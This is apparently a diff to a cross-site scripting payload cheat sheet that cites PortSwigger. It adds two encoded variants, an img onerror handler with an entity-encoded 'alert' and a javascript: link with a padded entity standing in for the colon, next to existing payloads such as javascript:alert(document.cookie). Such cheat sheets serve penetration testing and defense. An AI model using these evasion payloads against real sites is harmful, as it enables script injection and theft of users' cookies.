@@ -12,6 +12,8 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 -- **_InnerHTML / Standard Tag Injection_**
 ```html
 <img src=x onerror=alert(0)>
+
+<img src=x onerror="&#x61;lert(1)">
 ```
 
 -- **_Break out of`<select> / <option> (document.write)_`**
@@ -35,6 +37,8 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 -- **_Double Quotes HTML Encoded (href, src, action sinks)_**
 ```javascript
 javascript:alert(document.cookie)
+
+<a href="javascript&#00000000000058;alert(1)">Click me</a>
 ```
 
 -- **_Link tag (canonical) / Hidden attributes (Accesskey)_**
